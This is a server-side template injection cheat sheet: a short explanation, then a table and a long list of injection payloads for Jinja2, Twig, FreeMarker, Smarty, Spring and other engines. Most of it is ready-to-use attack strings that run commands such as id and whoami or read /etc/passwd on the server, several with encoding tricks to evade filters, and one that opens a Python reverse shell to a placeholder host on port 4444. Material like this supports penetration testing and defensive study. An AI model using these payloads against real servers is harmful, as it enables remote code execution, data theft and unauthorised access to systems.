# Server-Side Template Injection (SSTI)

## Description
Server-Side Template Injection (SSTI) is a type of security vulnerability that occurs when user input is insecurely embedded in server-side templates, allowing an attacker to execute arbitrary code on the server. This can lead to data exposure, remote code execution, and other malicious activities.

## Conditions to be Vulnerable
For a web application to be vulnerable to SSTI, the following conditions typically need to be met:
1. **Use of a Template Engine**: The application must utilize a server-side template engine (e.g., Jinja2, Twig, Django templates).
2. **Insecure Handling of User Input**: User input is directly or indirectly passed to the template engine without proper sanitization or validation.
3. **Dynamic Template Rendering**: The application allows dynamic rendering of templates based on user input.

## Where to Test
You can test for SSTI vulnerabilities in web applications that:
- Accept user input to dynamically generate content (e.g., search forms, profile pages).
- Use popular template engines, such as:
  - Jinja2 (Python)
  - Twig (PHP)
  - Django Templates (Python)
  - Mustache (JavaScript)

| Template Engine  | Payload                                      | Description                              |
|------------------|---------------------------------------------|------------------------------------------|
| **Jinja2**       | `{{ config }}`                             | Access the application configuration.    |
|                  | `{{ request }}`                            | Access the request object.               |
|                  | `{{ self }}`                               | Access the current object context.       |
|                  | `{{ 7*7 }}`                                | Evaluate mathematical expressions.       |
|                  | `{{ 'hello'.__class__.__mro__ }}`       | Get the method resolution order.         |
| **Django**       | `{{ self.__class__.mro() }}`              | Retrieve method resolution order.        |
|                  | `{{ request.GET }}`                        | Access GET parameters.                   |
|                  | `{{ request.POST }}`                       | Access POST parameters.                  |
|                  | `{{ ''|slice:'::1' }}`                     | Perform slicing operations.              |
| **Twig**         | `{{ dump(app) }}`                          | Dump the application context.            |
|                  | `{{ foo.bar() }}`                          | Call a method on an object.              |
|                  | `{{ config('app.debug') }}`               | Access application configuration.        |
| **Mustache**     | `{{#foo}}{{.}}{{/foo}}`                    | Iterate over `foo` and display items.   |
|                  | `{{#user}}{{name}}{{/user}}`              | Access user name from the user object.  |
| **Mako**         | `${config}`                                | Access the application configuration.    |
|                  | `${request}`                               | Access the request object.               |
|                  | `${self}`                                  | Access the current object context.       |
| **Handlebars**   | `{{#if (eq this "value")}}True{{else}}False{{/if}}` | Conditional expression evaluation.       |
|                  | `{{#each items}}<li>{{this}}</li>{{/each}}` | Iterate over items array.               |


|Name | Credit |
|-------|-----------|
|    payloadbox    |     https://github.com/payloadbox/ssti-payloads |             


## Common Payload
 ```bash 
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
